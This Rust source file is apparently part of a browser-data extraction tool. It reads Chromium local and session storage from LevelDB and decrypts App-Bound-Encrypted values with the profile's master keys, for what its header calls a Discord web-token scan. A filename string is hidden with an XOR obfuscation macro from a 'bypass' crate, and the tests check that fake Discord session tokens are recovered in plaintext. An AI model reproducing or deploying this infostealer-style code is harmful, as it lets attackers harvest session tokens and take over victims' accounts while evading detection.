//! Local/session storage extraction from LevelDB (Go: `browser/chromium/extract_storage.go`).
//!
//! Modern Chromium (≥127, App-Bound Encryption) seals localStorage values with
//! `v10:`/`v20:` prefixes under the profile's master keys. The extractors take
//! the installation's [`MasterKeys`] and decrypt such values before surfacing
//! the `StorageEntry`, so the raw value (and the Discord web-token scan) sees
//! plaintext.

use std::path::Path;

use hbd_core::StorageEntry;
use keyring::MasterKeys;

use crate::chromium::decrypt::decrypt_value;
use crate::chromium::error::Result;
use crate::chromium::leveldb::LevelDb;

/// Extracts localStorage entries from `Local Storage/leveldb`.
///
/// Keys are `_<origin>\0\x01<key>` since the M85 scheme lock (older profiles:
/// `<origin>\0\x01<key>`); meta entries are `META:<origin>\0\x01<meta-key>`.
/// Values may carry a `\x01` version prefix (session storage always does).
pub fn extract_local_storage(
    path: &Path,
    master_keys: Option<&MasterKeys>,
) -> Result<Vec<StorageEntry>> {
    let db = LevelDb::open(path)?;
    Ok(db
        .iter()
        .iter()
        .filter_map(|(k, v)| decode_storage_entry(k, v, master_keys))
        .collect())
}

/// Extracts sessionStorage entries from the `Session Storage` directory:
/// one single-file LevelDB per origin, named `<origin>.localstorage`.
/// (Go: opens each file via goleveldb's log-only single-file reader.)
pub fn extract_session_storage(
    path: &Path,
    master_keys: Option<&MasterKeys>,
) -> Result<Vec<StorageEntry>> {
    let mut storage = Vec::new();
    let entries = std::fs::read_dir(path)?;
    for entry in entries.flatten() {
        if !entry.file_type().map(|t| t.is_file()).unwrap_or(false)
            || !entry
                .file_name()
                .to_string_lossy()
                .ends_with(bypass::x!(".localstorage", 0x77).as_str())
        {
            continue;
        }
        let db = match LevelDb::open_log_only(&entry.path()) {
            Ok(db) => db,
            Err(e) => {
                log::debug!("session storage {}: {e}", entry.path().display());
                continue;
            }
        };
        storage.extend(
            db.iter()
                .iter()
                .filter_map(|(k, v)| decode_storage_entry(k, v, master_keys)),
        );
    }
    Ok(storage)
}

/// Decodes one LevelDB (key, value) pair into a storage entry.
/// Returns `None` for keys that don't carry the `\0\x01` separator.
///
/// Values starting with a Chromium version prefix (`v10`/`v11`/`v20`) are
/// decrypted with the given master keys when available; otherwise the raw
/// (possibly still-wrapped) bytes are kept.
fn decode_storage_entry(
    key: &[u8],
    value: &[u8],
    master_keys: Option<&MasterKeys>,
) -> Option<StorageEntry> {
    let key = key.strip_prefix(b"_").unwrap_or(key);
    let sep = key.iter().position(|&b| b == 0x01)?;
    let origin = &key[..sep];
    let origin = origin.strip_suffix(&[0]).unwrap_or(origin);
    let entry_key = &key[sep + 1..];

    let (is_meta, url) = match origin.strip_prefix(b"META:") {
        Some(rest) => (true, rest),
        None => (false, origin),
    };
    let value = value.strip_prefix(&[0x01]).unwrap_or(value);

    let value = decrypt_storage_value(value, master_keys);

    Some(StorageEntry {
        is_meta,
        url: String::from_utf8_lossy(url).into_owned(),
        key: String::from_utf8_lossy(entry_key).into_owned(),
        value: String::from_utf8_lossy(&value).into_owned(),
    })
}

/// Decrypts a storage value sealed with a Chromium version prefix, returning
/// the raw bytes untouched when no prefix, no keys, or a failed decrypt.
fn decrypt_storage_value(value: &[u8], master_keys: Option<&MasterKeys>) -> Vec<u8> {
    let Some(mk) = master_keys else {
        return value.to_vec();
    };
    match hbd_crypto::detect_version(value) {
        hbd_crypto::CipherVersion::V10
        | hbd_crypto::CipherVersion::V20
        | hbd_crypto::CipherVersion::V11 => match decrypt_value(mk, value) {
            Ok(plain) => plain,
            Err(e) => {
                log::debug!("storage decrypt: {e}");
                value.to_vec()
            }
        },
        _ => value.to_vec(),
    }
}

pub fn count_local_storage(path: &Path) -> Result<i64> {
    Ok(count_entries(path, extract_local_storage))
}

pub fn count_session_storage(path: &Path) -> Result<i64> {
    Ok(count_entries(path, extract_session_storage))
}

fn count_entries(
    path: &Path,
    f: fn(&Path, Option<&MasterKeys>) -> Result<Vec<StorageEntry>>,
) -> i64 {
    f(path, None).map(|v| v.len() as i64).unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    fn fixture_dir(name: &str) -> std::path::PathBuf {
        let dir =
            std::env::temp_dir().join(format!("hbd-storage-test-{}-{}", name, std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    // Test-only WAL log writer (single-file session storage format).
    fn wal_file(dir: &std::path::Path, name: &str, pairs: &[(&str, &[u8])]) -> std::path::PathBuf {
        use crate::chromium::leveldb::tests as ldb;
        let mut records = Vec::new();
        for (i, (key, value)) in pairs.iter().enumerate() {
            records.push(ldb::write_batch_for_tests(
                i as u64 * 2,
                &[(1u8, key.as_bytes(), *value)],
            ));
        }
        let path = dir.join(name);
        fs::write(&path, ldb::log_bytes_for_tests(&records)).unwrap();
        path
    }

    #[test]
    fn decode_scheme_locked_key() {
        let e = decode_storage_entry(b"_https://example.com\x00\x01theme", b"dark", None).unwrap();
        assert!(!e.is_meta);
        assert_eq!("https://example.com", e.url);
        assert_eq!("theme", e.key);
        assert_eq!("dark", e.value);
    }

    #[test]
    fn decode_meta_key() {
        let e = decode_storage_entry(
            b"META:https://example.com\x00\x01_scheme_lock",
            b"\x01https://example.com",
            None,
        )
        .unwrap();
        assert!(e.is_meta);
        assert_eq!("https://example.com", e.url);
        assert_eq!("_scheme_lock", e.key);
        assert_eq!(
            "https://example.com", e.value,
            "value version prefix stripped"
        );
    }

    #[test]
    fn decode_legacy_key_without_underscore() {
        let e = decode_storage_entry(b"https://example.com\x00\x01k", b"v", None).unwrap();
        assert_eq!("https://example.com", e.url);
        assert_eq!("k", e.key);
    }

    #[test]
    fn malformed_key_rejected() {
        assert!(decode_storage_entry(b"no-separator", b"v", None).is_none());
    }

    #[test]
    fn session_storage_reads_single_file_dbs() {
        let dir = fixture_dir("session");
        wal_file(
            &dir,
            "https_example.com_0.localstorage",
            &[
                ("_https://example.com\x00\x01a", b"\x01v1"),
                ("_https://example.com\x00\x01b", b"\x01v2"),
            ],
        );
        wal_file(
            &dir,
            "https_other.org_0.localstorage",
            &[("_https://other.org\x00\x01c", b"\x01v3")],
        );
        fs::write(dir.join("README"), b"not a db").unwrap();

        let entries = extract_session_storage(&dir, None).unwrap();
        assert_eq!(3, entries.len());
        assert!(
            entries
                .iter()
                .any(|e| e.url == "https://other.org" && e.key == "c")
        );
    }

    #[test]
    fn count_matches_entry_count() {
        let dir = fixture_dir("count");
        let db = dir.join("leveldb");
        fs::create_dir_all(&db).unwrap();
        wal_file(&db, "000001.log", &[("_https://x\x00\x01k", b"v")]);
        // LevelDb::open reads the log directly when no CURRENT/MANIFEST is present.
        let n = count_local_storage(&db).unwrap();
        assert_eq!(1, n);
    }

    #[test]
    fn v10_wrapped_value_decrypted_with_keys() {
        let key: Vec<u8> = (0..32).collect();
        let nonce = [7u8; 12];
        let plain = b"mxk-caught-the-token".to_vec();
        let mut blob = b"v10".to_vec();
        blob.extend_from_slice(&nonce);
        blob.extend_from_slice(&hbd_crypto::aead::aes_gcm_encrypt(&key, &nonce, &plain).unwrap());

        let mk = MasterKeys {
            v10: Some(key),
            ..Default::default()
        };
        let e =
            decode_storage_entry(b"_https://discord.com\x00\x01token", &blob, Some(&mk)).unwrap();
        assert_eq!("mxk-caught-the-token", e.value);
    }

    #[test]
    fn v20_wrapped_value_decrypted_with_keys() {
        let key: Vec<u8> = (0..32).collect();
        let nonce = [9u8; 12];
        let plain = b"mfa.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
            .to_vec();
        let mut blob = b"v20".to_vec();
        blob.extend_from_slice(&nonce);
        blob.extend_from_slice(&hbd_crypto::aead::aes_gcm_encrypt(&key, &nonce, &plain).unwrap());

        let mk = MasterKeys {
            v20: Some(key),
            ..Default::default()
        };
        let e =
            decode_storage_entry(b"_https://discord.com\x00\x01token", &blob, Some(&mk)).unwrap();
        assert!(e.value.starts_with("mfa."));
    }

    #[test]
    fn wrapped_value_kept_raw_without_keys() {
        let mut blob = b"v10".to_vec();
        blob.extend_from_slice(&[0u8; 24]);
        let e = decode_storage_entry(b"_https://discord.com\x00\x01token", &blob, None).unwrap();
        assert_eq!(String::from_utf8_lossy(&blob), e.value);
    }
}
